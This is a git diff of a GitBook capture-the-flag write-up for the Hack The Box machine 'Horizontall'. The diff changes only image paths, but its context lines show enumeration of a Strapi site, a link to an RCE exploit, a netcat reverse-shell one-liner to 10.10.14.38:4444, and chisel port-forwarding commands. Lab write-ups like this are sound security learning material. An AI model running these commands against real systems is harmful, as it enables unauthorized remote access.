@@ -28,7 +28,7 @@ We add <mark style="color:green;">horizontall.htb</mark> to our /etc/hosts file 
 
 Searching on Google informs us that the latest version of nginx is 1.21.6 (mainline version) and 1.20.2 (stable version). We'll keep this in mind
 
-![](<../../../../.gitbook/assets/image (7).png>)
+![](<../../../../.gitbook/assets/image (7) (1).png>)
 
 Going to the site, we see a web page.
 
@@ -52,7 +52,7 @@ Time to enumerate some more. Now there are two interesting directory that we can
 
 The reviews directory yields us some users: <mark style="color:green;">wail</mark>, <mark style="color:green;">doe</mark>, and <mark style="color:green;">john</mark>
 
-![](<../../../../.gitbook/assets/image (33).png>)
+![](<../../../../.gitbook/assets/image (33) (1).png>)
 
 And the admin page
 
@@ -66,7 +66,7 @@ Great! Now hopefully we can a version number somewhere
 
 It seems the current version of Strapi is 3.0.0-beta.17.4
 
-![](<../../../../.gitbook/assets/image (37).png>)
+![](<../../../../.gitbook/assets/image (37) (1).png>)
 
 Using searchsploit gives us some good news. An [RCE](https://www.exploit-db.com/exploits/50239)!
 
@@ -104,7 +104,7 @@ As it turns out, that was a very quick solution
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4444 >/tmp/f
 ```
 
-![](<../../../../.gitbook/assets/image (64).png>)
+![](<../../../../.gitbook/assets/image (64) (1).png>)
 
 After upgrading my shell, I searched for the user.txt file
 
@@ -153,7 +153,7 @@ Then we'll run the below commands on our kali machine and the victim machine res
 ./chisel client 10.10.14.38:7777 R:8000:127.0.0.1:8000 # on Victim
 ```
 
-![](<../../../../.gitbook/assets/image (38).png>)
+![](<../../../../.gitbook/assets/image (38) (1).png>)
 
 ![Victim machine](<../../../../.gitbook/assets/image (5).png>)
 
@@ -177,9 +177,9 @@ Awesome! Now we can cat the root.txt file
 
 This is nice, but a shell would be nicer :)
 
-![](<../../../../.gitbook/assets/image (18).png>)
+![](<../../../../.gitbook/assets/image (18) (1).png>)
 
-![](<../../../../.gitbook/assets/image (55).png>)
+![](<../../../../.gitbook/assets/image (55) (1).png>)
 
 {% hint style="info" %}
 Although we get a shell, it's not very stable. But it does the job regardless
@@ -187,4 +187,4 @@ Although we get a shell, it's not very stable. But it does the job regardless
 
 SUCCESS!
 
-![](<../../../../.gitbook/assets/image (15).png>)
+![](<../../../../.gitbook/assets/image (15) (1).png>)
